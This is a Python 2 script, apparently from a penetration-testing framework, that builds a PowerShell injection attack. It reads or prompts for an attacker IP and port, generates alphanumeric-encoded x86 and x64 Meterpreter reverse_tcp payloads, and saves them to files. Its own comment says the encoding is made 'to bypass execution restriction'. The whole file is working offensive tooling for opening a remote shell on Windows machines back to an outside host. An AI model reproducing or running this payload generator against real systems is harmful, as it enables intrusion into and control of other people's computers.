#!/usr/bin/python
import base64
import sys
import subprocess
import re
import os
import time
from src.core.setcore import *

# grab ipaddress
if os.path.isfile("src/program_junk/ipaddr.file"):
    fileopen = file("src/program_junk/ipaddr.file", "r")
    ipaddr = fileopen.read()
else: 
    ipaddr = raw_input("Enter the ipaddress for the reverse connection: ")
    filewrite = file("src/program_junk/ipaddr.file", "w")
    filewrite.write(ipaddr)

if os.path.isfile("src/program_junk/port.options"):
    fileopen = file("src/program_junk/port.options", "r")
    port = fileopen.read()

else: 
    filewrite=file("src/program_junk/port.options", "w")
    port = raw_input("Enter the port number for the reverse [443]: ")
    if port == "":
        port = "443"
    filewrite.write(port)

# payload prep
if os.path.isfile("src/program_junk/metasploit.payload"):
    fileopen = file("src/program_junk/metasploit.payload", "r")
    payload = fileopen.read()
    if payload == "windows/meterpreter/reverse_tcp":        
        x86_payload = "windows/meterpreter/reverse_tcp"
        x64_payload = "windows/x64/meterpreter/reverse_tcp"

else: 
    x86_payload = "windows/meterpreter/reverse_tcp"
    x64_payload = "windows/x64/meterpreter/reverse_tcp"

print_status("Generating x64-based powershell injection code...")
x64 = generate_powershell__alphanumeric_payload("windows/x64/meterpreter/reverse_tcp", ipaddr, port)
print_status("Generating x86-based powershell injection code...")
x86 = generate_powershell__alphanumeric_payload("windows/meterpreter/reverse_tcp", ipaddr, port)

# check to see if we want to display the powershell command to the user
verbose = check_config("POWERSHELL_VERBOSE=")
if verbose.lower() == "on":
    print_status("Printing the x64 based encoded code...")
    time.sleep(3)
    print x64
    print_status("Printing the x86 based encoded code...")
    time.sleep(3)
    print x86

filewrite = file("src/program_junk/x64.powershell", "w")
filewrite.write(x64)
filewrite.close()
filewrite = file("src/program_junk/x86.powershell", "w")
filewrite.write(x86)
filewrite.close()
print_status("Finished generating powershell injection attack and is encoded to bypass execution restriction...")
